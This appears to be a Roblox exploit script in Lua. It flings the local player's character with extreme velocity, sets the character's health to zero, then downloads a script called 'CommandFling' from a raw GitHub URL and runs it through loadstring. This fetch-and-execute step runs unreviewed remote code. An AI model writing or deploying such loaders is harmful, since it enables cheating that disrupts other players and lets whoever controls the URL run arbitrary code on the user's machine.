local LocalPlayer = game.Players.LocalPlayer
local HumanoidRootPart = LocalPlayer.Character.HumanoidRootPart
local Velocity = HumanoidRootPart.AssemblyLinearVelocity

function main()
    local url = "https://raw.githubusercontent.com/3isht/3isht/refs/heads/master/CommandFling"
    local success, result = pcall(function()
        return game:HttpGet(url)
    end)

    if success then
        print("Script fetched successfully.")
        print(result)  -- Print the fetched script content for inspection

        local func, err = loadstring(result)
        if func then
            func()
        else
            print("Error loading script: ", err)
        end
    else
        print("Error fetching script: ", result)
    end
end

for i = 1, 5 do
    HumanoidRootPart.AssemblyLinearVelocity = Vector3.new(666,666,6e6)
    if i == 5 then
        LocalPlayer.Character.Humanoid.Health = 0
        task.wait(1.5)
        main()
    end
end
